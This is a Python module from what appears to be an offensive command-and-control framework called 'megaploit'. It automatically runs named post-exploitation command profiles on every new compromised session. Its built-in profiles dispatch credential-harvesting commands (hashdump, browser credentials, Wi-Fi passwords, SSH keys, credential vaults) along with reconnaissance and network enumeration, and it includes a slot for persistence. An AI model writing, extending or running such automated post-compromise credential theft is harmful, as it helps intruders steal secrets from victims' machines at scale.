"""
megaploit.core.pipeline
~~~~~~~~~~~~~~~~~~~~~~~
Post-exploitation pipeline — automatically execute a set of named command
"profiles" after every new session opens.

A *profile* is a named collection of C2 commands (not Module objects) that
are dispatched to a session in order.  Profiles map well to standard
post-exploitation playbooks.

Built-in profiles
-----------------
* ``basic``      — sysinfo, whoami, pwd, env
* ``creds``      — hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault
* ``recon``      — ps, installed_software, scheduled_tasks, users, os_info
* ``network``    — arp, netstat, ifconfig, routes
* ``enum``       — installed_software, startup_items, scheduled_tasks, services, …
* ``cred_harvest`` — alias for creds (new name)
* ``baseline``   — sysinfo, os_info, whoami, netstat, ps, routes, ifconfig, arp
* ``full``       — all of basic + creds + recon + network

Operators enable or disable profiles interactively:

    pipeline enable  creds
    pipeline disable creds

The pipeline is thread-safe; profiles can be toggled while sessions are
active.

Configuration
-------------
Profiles are declared in ``pipeline.yaml`` (optional) in the current working
directory; built-in profiles are always available.  Example::

    profiles:
      custom_enum:
        - "shell whoami"
        - netstat
        - arp

Usage
-----
    from megaploit.core.pipeline import pipeline

    cmds = pipeline.commands_for(session)
    # -> list[str] in declaration order across all enabled profiles

    pipeline.enable_profile("creds")
    pipeline.disable_profile("basic")
    pipeline.reload_autorun()   # re-merge autorun global cmds into baseline
"""

from __future__ import annotations

import json
import os
import threading
from typing import Optional

__all__ = ["Pipeline", "pipeline", "_PROFILES"]

_PROFILE_PATH = "pipeline.yaml"

# ---------------------------------------------------------------------------
# Built-in profiles
# ---------------------------------------------------------------------------

_PROFILES: dict[str, list[str]] = {
    "basic": [
        "sysinfo",
        "whoami",
        "pwd",
        "env",
    ],
    "creds": [
        "hashdump",
        "wifi_passwords",
        "browser_creds",
        "ssh_harvest",
        "cred_vault",
    ],
    "recon": [
        "ps",
        "installed_software",
        "scheduled_tasks",
        "users",
        "os_info",
    ],
    "network": [
        "arp",
        "netstat",
        "ifconfig",
        "routes",
    ],
    "baseline": [
        "sysinfo",
        "os_info",
        "whoami",
        "netstat",
        "ps",
        "routes",
        "ifconfig",
        "arp",
    ],
    "enum": [
        "installed_software",
        "startup_items",
        "scheduled_tasks",
        "services",
        "users",
        "logged_in",
        "env",
        "active_windows",
    ],
    "cred_harvest": [
        # alias for creds with extra
        "hashdump",
        "wifi_passwords",
        "browser_creds all",
        "cred_vault",
        "ssh_harvest",
    ],
    "persistence": [
        # disabled by default; enable via:  pipeline enable persistence
    ],
}

# "full" = all of the original four profiles merged (backwards compat)
_PROFILES["full"] = [
    cmd
    for profile in ("basic", "creds", "recon", "network")
    for cmd in _PROFILES[profile]
]


# ---------------------------------------------------------------------------
# YAML/JSON loader
# ---------------------------------------------------------------------------

def _load_config(path: str) -> dict:
    if not os.path.isfile(path):
        return {}
    import logging as _log
    try:
        try:
            import yaml
            with open(path, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f) or {}
            return data if isinstance(data, dict) else {}
        except ImportError:
            pass
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception as exc:
        # L10: log parse errors so operators know why profiles are missing
        _log.getLogger(__name__).warning(
            "Failed to load pipeline config %r: %s", path, exc
        )
        return {}


# ---------------------------------------------------------------------------
# Pipeline
# ---------------------------------------------------------------------------

class Pipeline:
    """
    Wraps AutoRunScript and adds named collection profiles.

    Profiles add commands on top of the autorun baseline; they can be
    individually enabled/disabled at runtime without touching the config file.
    """

    def __init__(self, path: str = _PROFILE_PATH) -> None:
        self._path    = path
        self._lock    = threading.Lock()
        self._profiles: dict[str, list[str]] = dict(_PROFILES)
        self._active_profiles: set[str]      = set()

        # AutoRunScript provides the baseline for commands_for
        from megaploit.core.autorun import AutoRunScript
        self._autorun = AutoRunScript()

        # Merge any user-defined profiles from disk
        self._load_user_profiles()

    # ------------------------------------------------------------------
    # Loading
    # ------------------------------------------------------------------

    def _load_user_profiles(self) -> None:
        cfg = _load_config(self._path)
        for name, cmds in (cfg.get("profiles") or {}).items():
            if isinstance(cmds, list):
                self._profiles[name] = [str(c) for c in cmds if str(c).strip()]

    def reload_autorun(self) -> None:
        """Reload the underlying autorun config from disk."""
        self._autorun.reload()

    # ------------------------------------------------------------------
    # Profile management
    # ------------------------------------------------------------------

    def available_profiles(self) -> list[str]:
        """Return all known profile names."""
        with self._lock:
            return sorted(self._profiles)

    def enable_profile(self, name: str) -> None:
        """Enable a collection profile by name.  Raises KeyError if unknown."""
        with self._lock:
            if name not in self._profiles:
                raise KeyError(
                    f"Unknown pipeline profile: {name!r}. "
                    f"Available: {sorted(self._profiles)}"
                )
            self._active_profiles.add(name)

    def disable_profile(self, name: str) -> None:
        """Disable a collection profile."""
        with self._lock:
            self._active_profiles.discard(name)

    def active_profiles(self) -> list[str]:
        """Return sorted list of currently active profiles."""
        with self._lock:
            return sorted(self._active_profiles)

    def is_enabled(self, name: str) -> bool:
        with self._lock:
            return name in self._active_profiles

    # ------------------------------------------------------------------
    # Command resolution
    # ------------------------------------------------------------------

    def commands_for(self, session) -> list[str]:
        """
        Return the ordered, deduplicated command list for *session*.

        = autorun baseline  +  all active profile commands
        """
        base = self._autorun.commands_for(session)

        seen: set[str] = set(base)
        extra: list[str] = []

        with self._lock:
            active = list(self._active_profiles)

        for profile_name in sorted(active):
            for cmd in self._profiles.get(profile_name, []):
                if cmd not in seen:
                    seen.add(cmd)
                    extra.append(cmd)

        return base + extra

    def summary(self) -> dict:
        return {
            "autorun":           self._autorun.summary(),
            "active_profiles":   self.active_profiles(),
            "available_profiles": self.available_profiles(),
        }

    def __repr__(self) -> str:
        return f"<Pipeline  profiles={self.active_profiles()!r}>"


# ---------------------------------------------------------------------------
# Singleton
# ---------------------------------------------------------------------------

pipeline = Pipeline()
